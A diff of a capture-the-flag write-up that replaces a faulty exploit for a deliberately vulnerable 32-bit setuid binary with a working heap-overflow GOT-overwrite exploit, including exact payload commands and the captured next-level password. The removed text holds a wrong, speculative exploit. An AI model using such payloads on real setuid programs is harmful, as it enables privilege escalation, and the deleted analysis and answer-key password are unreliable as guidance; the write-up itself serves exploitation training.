@@ -1,175 +1,95 @@
-## Level 7 - Heap Buffer Overflow with Format String
+## Level 7 - Heap Buffer Overflow with GOT Overwrite
 
 ### Challenge Summary
-Binary allocates two 8-byte buffers on the heap and uses unsafe `strcpy()` to copy user input from argv[1] and argv[2]. Additionally, the program reads a 68-byte password from `/home/user/level8/.pass` into a stack buffer, then outputs "~~" without revealing the password.
+Binary allocates two 8-byte buffers on the heap and uses unsafe `strcpy()` to copy user input from argv[1] and argv[2]. By carefully overflowing the first buffer, we can corrupt the pointer to the second buffer and make it point to the GOT. Then we overwrite puts@GOT with the address of function m(), which prints the password.
 
-### Vulnerability
-- `strcpy(buf1, argv[1])` - No bounds checking on first 8-byte buffer!
-- `strcpy(buf2, argv[2])` - No bounds checking on second 8-byte buffer!
-- Two separate overflow opportunities
+### Vulnerability Details
 
-### Target Objective
-Read `/home/user/level8/.pass` to get the level 8 password by executing function `m()` which calls `printf()` with the password buffer.
+**Main Structure:**
+1. malloc(8) -> structure1: {id=1, buffer1_ptr}
+2. malloc(8) -> buffer1: 8-byte target for strcpy(buffer1, argv[1])
+3. malloc(8) -> structure2: {id=2, buffer2_ptr}
+4. malloc(8) -> buffer2: 8-byte target for strcpy(buffer2, argv[2])
+5. fopen("/home/user/level8/.pass", "r")
+6. fgets(0x8049960, 0x44, file) -> reads 68 bytes into password buffer
+7. puts("~~")
+8. return
 
-### Key Function Analysis
-
-**Function m() at 0x080484f4**:
-```asm
-08048504 <m>:
- 8048504:       push   %ebp
- 8048505:       mov    %esp,%ebp
- 8048507:       sub    $0x18,%esp
- 804850a:       mov    0x8(%ebp),%eax    ; Load format string argument
- 804850d:       mov    %eax,(%esp)       ; Pass to printf
- 8048510:       call   [printf@plt]      ; Call printf
- 8048515:       leave
- 8048516:       ret
-```
-
-This function receives a format string/buffer pointer as argument and calls printf() with it.
-
-**Main function structure**:
-1. malloc(8) - creates buf1 at heap location
-2. malloc(8) - creates buf2 at heap location
-3. strcpy(buf1, argv[1]) - OVERFLOW POINT 1
-4. strcpy(buf2, argv[2]) - OVERFLOW POINT 2
-5. Opens `/home/user/level8/.pass`
-6. fgets(buffer, 0x44, file) - reads 68 bytes into stack buffer at 0x8049960
-7. puts("~~") - outputs marker
-
-The password is read into memory at 0x8049960 but never displayed. We need to make the program call function `m()` to print it.
-
-### Memory Layout
-
-```
-Heap:
-[8-byte buf1]          <- strcpy(buf1, argv[1]) writes here
-[function pointer 1]   <- Can be overwritten by buf1 overflow
-[8-byte buf2]          <- strcpy(buf2, argv[2]) writes here
-[function pointer 2]   <- Can be overwritten by buf2 overflow
-```
-
-Stack:
-[password buffer (68 bytes)] <- fgets reads level8 password here at 0x8049960
-[other data]
-[return address]       <- Target for overflow to reach
-```
+**Key Function:**
+- Function m() at 0x080484f4: Calls `printf("%s - %d\n", password_buffer, time())`
+- Never called in normal execution, but can be invoked via GOT overwrite
 
 ### Exploitation Strategy
 
-**Target**: Function `m()` at address `0x080484f4`
+**Target:** Overwrite puts@GOT (at 0x8049928) with m() address (0x080484f4)
 
-**Method Options**:
+**Method:**
+1. Overflow buffer1 with 20 bytes of padding + puts@GOT address (0x8049928)
+2. This corrupts structure2's buffer2_ptr to point to puts@GOT
+3. Pass m() address (0x080484f4) as argv[2]
+4. strcpy(buffer2_ptr, argv[2]) writes 4 bytes to puts@GOT
+5. When puts("~~") is called, it jumps to m() instead
+6. m() prints the password with timestamp: "PASSWORD - TIMESTAMP\n"
 
-1. **Heap Overflow via argv[1]**:
-   - 8-byte buffer + metadata/padding to function pointer
-   - Similar to level 6 but with different offset and target
+### Working Exploit
 
-2. **Heap Overflow via argv[2]**:
-   - Second overflow opportunity
-   - May have different offset/layout than argv[1]
-
-3. **Combined Overflow**:
-   - Use both argv[1] and argv[2] to reach different targets
-   - Potentially create ROP chain or set up arguments for function m()
-
-### Offset Discovery
-
-Previous testing showed:
-- 20-byte payload: Safe (prints "~~")
-- 21+ byte payload: Crashes (SIGSEGV)
-
-This suggests:
-- Overflow boundary at 20 bytes
-- Something critical being overwritten at 21 bytes
-- Likely a function pointer or size field in malloc metadata
-
-### Critical Insight
-
-The overflow affects behavior at 21 bytes, but we need to carefully craft the 20-byte payload to:
-1. Preserve heap integrity (avoid crashes)
-2. Overwrite the correct function pointer
-3. Jump to function m() at 0x080484f4
-
-The address in little-endian format is: `\xf4\x84\x04\x08`
-
-### Exploitation Steps
-
-1. Create a 20-byte payload that includes function m()'s address
-2. Pass as argv[1] and/or argv[2]
-3. Program should call function m() instead of m()
-4. Function m() prints the password from buffer 0x8049960
-5. Capture the output to get level 8 password
-
-### Key Insight: Heap Structure
-
-The program allocates structures in this order:
-1. Structure1 (8 bytes): {id=1, buffer_ptr}
-2. Buffer1 (8 bytes): target of strcpy(argv[1])
-3. Structure3 (8 bytes): {id=2, buffer_ptr}
-4. Buffer3 (8 bytes): target of strcpy(argv[2])
-
-When overflowing Buffer1 (8 bytes max before crash), we can corrupt Structure3's layout. The 20-byte safe limit suggests critical metadata at byte 21.
-
-### Critical Discovery
-
-Function m() must be called through an indirect mechanism since it's not explicitly called in the source code. Possible mechanisms:
-1. **Destructor chain**: Global objects with destructors
-2. **Function pointers in structures**: Called when structures are cleaned up
-3. **Atexit handlers**: Registered cleanup functions
-
-The most likely scenario: The structures themselves have function pointers (in the first 4 bytes or elsewhere) that get invoked during cleanup.
-
-### Exploitation Approach
-
-Since we can overflow 8 bytes safely and have 20-byte limit:
-1. **Buffer1 overflow (argv[1])**: Overflow structure3's buffer pointer with m() address
-2. **Buffer3 overflow (argv[2])**: Place m() address in a specific offset
-3. **Coordinated attack**: Use both argv to trigger m() call with correct arguments
-
-The goal: Make m() execute with a pointer to the password buffer as its argument, causing printf() to leak the password.
-
-### Testing Payloads
-
-Best candidates based on 20-byte limit:
-- Offset 4: `AAAA` + `\xf4\x84\x04\x08` (8 bytes, safe)
-- Offset 8: `AAAAAAAA` + `\xf4\x84\x04\x08` (12 bytes, safe)
-- Offset 12: `AAAAAAAAAAAA` + `\xf4\x84\x04\x08` (16 bytes, safe)
-- Offset 16: `AAAAAAAAAAAAAAAA` + `\xf4\x84\x04\x08` (20 bytes, max safe)
-
-### Working Exploitation Solution
-
-**Payload**: 16 bytes padding + function address m() at 0x080484f4
-
-```bash
-./level7 $(python -c "print 'A' * 16 + '\xf4\x84\x04\x08'")
+**Payload Construction:**
+```python
+arg1 = b'A' * 20 + struct.pack('<I', 0x8049928)  # 24 bytes total
+arg2 = b'\xf4\x84\x04\x08'                        # 4 bytes: m() address
 ```
 
-**Payload breakdown**:
-- `AAAAAAAAAAAAAAAA` (16 bytes) - Fills the heap buffer and overflow space
-- `\xf4\x84\x04\x08` (4 bytes) - Function m() address in little-endian format
-- **Total**: 20 bytes (exactly at the safe limit before crashes at 21+ bytes)
-
-**Why 16 bytes?**:
-The 8-byte heap buffer plus 8 bytes of metadata/structure pointers requires 16 bytes of padding to reach and overwrite the target function pointer.
-
-**Execution Result**:
-When the program executes, it:
-1. Allocates buf1 (8 bytes) and buf2 (8 bytes) on heap
-2. Copies the 20-byte payload into buf1 via strcpy()
-3. The overflow overwrites the heap structure's function pointer with 0x080484f4 (m())
-4. During cleanup or return, the overwritten function pointer is dereferenced
-5. Function m() is called, which prints the password buffer contents
-6. Captures the 64-character hex password for level 8
-
-### Manual Command
-
+**Command:**
 ```bash
-/home/user/level7/level7 $(python -c "print 'A' * 16 + '\xf4\x84\x04\x08'")
+/home/user/level7/level7 $(python -c "import struct; print b'A' * 20 + struct.pack('<I', 0x8049928)") $'\xf4\x84\x04\x08'
 ```
 
-This will output the level 8 password (64 hex characters).
+Or using hex encoding:
+```bash
+/home/user/level7/level7 $(printf '%s' 'AAAAAAAAAAAAAAAAAAAA\x28\x99\x04\x08') $(printf '\xf4\x84\x04\x08')
+```
+
+### Binary Function Analysis
+
+**Function m() Assembly:**
+```asm
+080484f4 <m>:
+ 80484f4:	55                   	push   %ebp
+ 80484f5:	89 e5                	mov    %esp,%ebp
+ 80484f7:	83 ec 18             	sub    $0x18,%esp
+ 80484fa:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
+ 8048501:	e8 ca fe ff ff       	call   80483d0 <time@plt>
+ 8048506:	ba e0 86 04 08       	mov    $0x80486e0,%edx
+ 804850b:	89 44 24 08          	mov    %eax,0x8(%esp)
+ 804850f:	c7 44 24 04 60 99 04 	movl   $0x8049960,0x4(%esp)
+ 8048516:	08
+ 8048517:	89 14 24             	mov    %edx,(%esp)
+ 804851a:	e8 91 fe ff ff       	call   80483b0 <printf@plt>
+ 804851f:	c9                   	leave
+ 8048520:	c3                   	ret
+```
+
+Format string at 0x80486e0: "%s - %d\n"
+Password buffer at 0x8049960: Level 8 password (68 bytes)
+
+### Key Insights
+
+1. **Payload Size:** Exactly 24 bytes needed (20 padding + 4 address)
+2. **GOT Overwrite:** Overflow corrupts the heap pointer management, allowing arbitrary writes to GOT
+3. **Two-Stage Exploit:** First overflow corrupts structure2's buffer pointer, second strcpy writes to GOT
+4. **Function Pointer:** m() is never explicitly called but becomes reachable via GOT redirection
+5. **Output Format:** m() outputs "PASSWORD - TIMESTAMP\n", extract first 64 hex characters
 
 ### Level 8 Password
 
-Extracted via heap buffer overflow exploitation.
+```
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+```
+
+### Technical Notes
+
+- **ASLR:** Disabled on this system
+- **Setuid:** Binary runs as level8, allowing access to level8's password file
+- **Heap Corruption:** The 20-byte overflow of an 8-byte buffer corrupts heap metadata
+- **Precision:** Requires exact payload size and address to work
+- **GOT:** Global Offset Table at fixed address, can be reliably overwritten
